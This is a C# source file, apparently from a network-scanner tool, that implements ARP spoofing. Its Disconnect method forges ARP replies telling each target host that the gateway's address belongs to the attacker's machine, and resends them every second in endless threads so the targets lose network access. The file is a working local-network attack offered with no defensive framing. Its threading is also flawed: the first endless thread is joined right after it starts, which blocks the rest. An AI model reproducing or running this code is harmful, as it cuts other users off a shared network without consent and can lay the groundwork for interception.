using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace IPScanner.Services.Imples
{
    class ARPSproofService : IARPSproofService
    {
        private Dictionary<IPAddress, PhysicalAddress> targetlist;

        private LibPcapLiveDevice currentDevice;

        private ICollection<Thread> arpSproofThreads;

        private INetworkService NetworkService;

        public ARPSproofService()
        {
            if (this.NetworkService == null)
            {
                this.NetworkService = new NetworkService();
            }

            if (this.targetlist == null)
            {
                this.targetlist = new Dictionary<IPAddress, PhysicalAddress>();
            }

            if (this.arpSproofThreads == null)
            {
                this.arpSproofThreads = new List<Thread>();
            }
        }

        public void Disconnect(Dictionary<IPAddress, PhysicalAddress> targetlist, LibPcapLiveDevice device, PhysicalAddress gatewayMac)
        {
            if (targetlist == null)
            {
                throw new ArgumentNullException("Target list is null.");
            }

            try
            {
                // stop all thread and clear all thread
                if (this.arpSproofThreads.Count > 0)
                {
                    foreach (Thread arp in this.arpSproofThreads)
                    {
                        arp.Abort();
                    }
                }

                // clear target list
                this.targetlist.Clear();
                foreach (var target in targetlist)
                {
                    this.targetlist.Add(target.Key, target.Value);
                }

                this.currentDevice = device;

                if (!this.currentDevice.Opened)
                {
                    this.currentDevice.Open();
                }

                this.arpSproofThreads.Clear();
                IPAddress gatewayIp = this.NetworkService.GetGatewayIP(this.currentDevice.Interface.FriendlyName);
                IPAddress ipV4 = this.currentDevice.Addresses[3].Addr.ipAddress;

                foreach (var target in this.targetlist)
                {

                    // ARPPacket arppacketforgatewayrequest = new ARPPacket(ARPOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), gatewayIp, this.currentDevice.MacAddress, target.Key);
                    ARPPacket arppacketforgatewayrequest = new ARPPacket(ARPOperation.Response, target.Value, target.Key, this.currentDevice.MacAddress, gatewayIp);

                    //EthernetPacket ethernetpacketforgatewayrequest = new EthernetPacket(this.currentDevice.MacAddress, gatewayMac, EthernetPacketType.Arp);
                    EthernetPacket ethernetpacketforgatewayrequest = new EthernetPacket(this.currentDevice.MacAddress, target.Value, EthernetPacketType.Arp);

                    ethernetpacketforgatewayrequest.PayloadPacket = arppacketforgatewayrequest;

                    this.arpSproofThreads.Add(new Thread(() =>
                    {
                        try
                        {
                            while (true)
                            {
                                this.currentDevice.SendPacket(ethernetpacketforgatewayrequest);
                                Thread.Sleep(1000);
                                // Console.WriteLine("ARP Sproofing...");
                            }
                        }
                        catch (PcapException ex)
                        {
                            throw ex;
                        }

                    }));
                }

                // restart all thread
                if (this.arpSproofThreads.Count > 0)
                {
                    foreach (Thread arp in this.arpSproofThreads)
                    {
                        arp.Start();
                        arp.Join();
                    }
                }
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }
    }
}
